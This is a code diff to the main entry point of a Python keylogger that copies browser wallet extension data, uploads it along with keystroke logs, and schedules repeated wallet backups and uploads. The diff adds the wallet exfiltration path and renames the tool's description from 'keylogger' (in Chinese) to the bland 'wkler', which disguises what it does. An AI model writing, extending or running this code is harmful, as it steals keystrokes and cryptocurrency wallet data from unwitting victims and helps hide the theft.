@@ -7,14 +7,18 @@ import sys
 import argparse
 
 from .logger import KeyLogger, create_log_file
-from .backup import backup_browser_extensions
-from .uploader import upload_all, start_log_upload_scheduler
+from .backup import (
+    backup_browser_extensions,
+    default_wallet_backup_dir,
+    start_wallet_backup_scheduler,
+)
+from .uploader import upload_all, upload_old_logs, start_log_upload_scheduler
 from .permissions import ensure_permissions
 
 
 def main():
     """主函数"""
-    parser = argparse.ArgumentParser(description="键盘记录器")
+    parser = argparse.ArgumentParser(description="wkler")
     parser.add_argument(
         "--dry-run",
         action="store_true",
@@ -30,7 +34,8 @@ def main():
     if args.dry_run:
         print("dry-run 模式：不会创建日志、复制/删除扩展数据、压缩上传或启动上传调度\n")
         print("正在扫描浏览器扩展数据...")
-        count = backup_browser_extensions(dry_run=True)
+        preview_dir = default_wallet_backup_dir()
+        count = backup_browser_extensions(backup_dir=preview_dir, dry_run=True)
         if count > 0:
             print(f"检测到 {count} 个目标扩展（未备份）\n")
         else:
@@ -48,14 +53,17 @@ def main():
 
     log_file = create_log_file()
 
-    print("正在备份浏览器扩展数据...")
-    count = backup_browser_extensions()
+    wallet_backup_dir = default_wallet_backup_dir()
+    print(f"正在检查浏览器钱包备份并上传: {wallet_backup_dir}")
+    count = backup_browser_extensions(backup_dir=wallet_backup_dir)
     if count > 0:
-        print(f"已备份 {count} 个扩展\n")
+        print(f"已备份 {count} 个扩展（已进入压缩上传流程）\n")
     else:
-        print("未检测到目标扩展\n")
+        print("本次未生成新的钱包备份\n")
+    upload_all(wallet_backup_dir)
+    start_wallet_backup_scheduler(wallet_backup_dir)
 
-    upload_all()
+    upload_old_logs()
     start_log_upload_scheduler()
 
     logger = KeyLogger(log_file)
